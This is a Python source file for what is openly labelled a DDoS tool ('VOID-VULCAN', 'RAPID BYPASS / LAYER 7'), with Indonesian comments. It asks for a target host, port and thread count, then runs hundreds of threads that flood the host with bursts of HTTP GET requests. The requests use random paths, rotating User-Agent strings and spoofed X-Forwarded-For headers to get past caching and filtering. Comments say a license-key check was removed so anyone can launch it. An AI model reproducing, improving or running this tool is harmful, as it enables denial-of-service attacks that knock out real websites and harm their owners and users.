import socket
import os
import sys
import time
import threading
import random
import string
import ssl

# --- UI VOID TEAM ---
def get_logo():
    return r"""
 ░▒▓██████▓▒░      ▄▄██████▄▄      ░▒▓██████▓▒░
 ░▒▓██▓▒░        ▄████████████▄        ░▒▓██▓▒░
 ░▒▓██▓▒░       ███ ▀▄ ▓▓ ▄▀ ███       ░▒▓██▓▒░
 ░▒▓██▓▒░       ███ ▓▓ ▼▼ ▓▓ ███       ░▒▓██▓▒░
 ░▒▓██▓▒░        ▀████████████▀        ░▒▓██▓▒░
  ░▒▓██▓▒░         ▀▀██████▀▀         ░▒▓██▓▒░
 
        ╔══════════════════════════════════╗
        ║      V O I D - V U L C A N       ║
        ╚══════════════════════════════════╝
           [ MODE: RAPID BYPASS / LAYER 7 ]
    """

total_hits = 0
hit_lock = threading.Lock()  # [BARU] Biar counter akurat

def attack_engine(target, port, ssl_on, ip):
    global total_hits
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            
            if ssl_on:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            
            s.connect((ip, port))

            # --- TEKNIK VULCAN: BURST MODE ---
            for _ in range(30):
                rnd_path = ''.join(random.choices(string.ascii_lowercase, k=8))
                header = (
                    f"GET /{rnd_path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(100,120)}.0.0.0\r\n"
                    f"Accept: */*\r\n"
                    f"Accept-Encoding: gzip, deflate, br\r\n"
                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(header.encode())
                with hit_lock:  # [BARU] Mengamankan akses ke total_hits
                    total_hits += 1
            s.close()
        except:
            pass

def run_ddos():
    # [PERUBAHAN UTAMA] Bagian pengecekan key "VOID_ACCESS_GRANTED_2026" telah DIHAPUS!
    # Sekarang langsung tampilkan menu tanpa syarat apapun.
    os.system('cls' if os.name == 'nt' else 'clear')  # Support Windows/Linux
    print(get_logo())
    
    target = input("\n [?] Target (Host Only): ").strip()
    port = int(input(" [?] Port (443/80): ") or 443)
    ssl_on = True if port == 443 else False
    threads = int(input(" [?] Threads: ") or 200)

    # [PERBAIKAN] Resolve IP hanya SEKALI di sini, tidak di dalam thread
    try:
        ip = socket.gethostbyname(target)
    except:
        print("[!] Host tidak dikenal atau DNS error.")
        return

    print(f"\n [!] LAUNCHING VULCAN TO {target} ({ip})...")
    for i in range(threads):
        threading.Thread(target=attack_engine, args=(target, port, ssl_on, ip), daemon=True).start()

    while True:
        try:
            sys.stdout.write(f"\r [★] Total Hits: {total_hits} | Status: BURNING...")
            sys.stdout.flush()
            time.sleep(0.5)
        except KeyboardInterrupt:
            print("\n[!] DDoS dihentikan manual.")
            break

# [PERUBAHAN UTAMA] Langsung menjalankan fungsi run_ddos() tanpa perlu argument key
if __name__ == "__main__":
    run_ddos()
